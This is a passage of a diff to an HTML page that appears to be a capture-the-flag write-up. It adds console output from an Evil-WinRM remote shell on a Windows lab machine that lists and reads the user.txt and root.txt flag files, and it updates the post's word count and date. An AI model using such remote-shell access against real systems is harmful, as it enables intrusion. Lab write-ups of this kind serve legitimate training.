+</span></span><span style="display:flex;"><span>Mode                LastWriteTime         Length Name
+</span></span><span style="display:flex;"><span>----                -------------         ------ ----
+</span></span><span style="display:flex;"><span>-ar---         4/5/2026  12:00 PM             <span style="color:#ae81ff">34</span> root.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Directory: C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\n</span>ikk37<span style="color:#ae81ff">\D</span>esktop
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Mode                LastWriteTime         Length Name
+</span></span><span style="display:flex;"><span>----                -------------         ------ ----
+</span></span><span style="display:flex;"><span>-ar---         4/5/2026  12:00 PM             <span style="color:#ae81ff">34</span> user.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>esktop&gt; type C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\M</span>artin<span style="color:#ae81ff">\D</span>esktop<span style="color:#ae81ff">\r</span>oot.txt
+</span></span><span style="display:flex;"><span>1f50fe01********687a739d5bff4
+</span></span></code></pre></div>
       </div>
     </article>
 
@@ -1678,7 +1797,7 @@
           <line x1="16" y1="17" x2="8" y2="17"></line>
           <polyline points="10 9 9 9 8 9"></polyline>
         </svg>
-        5726 Words
+        6053 Words
       </p>
 
       <p>
@@ -1689,7 +1808,7 @@
           <line x1="3" y1="10" x2="21" y2="10"></line>
         </svg>
         
-          2026-03-19 13:00
+          2026-04-05 12:00
         
 
          
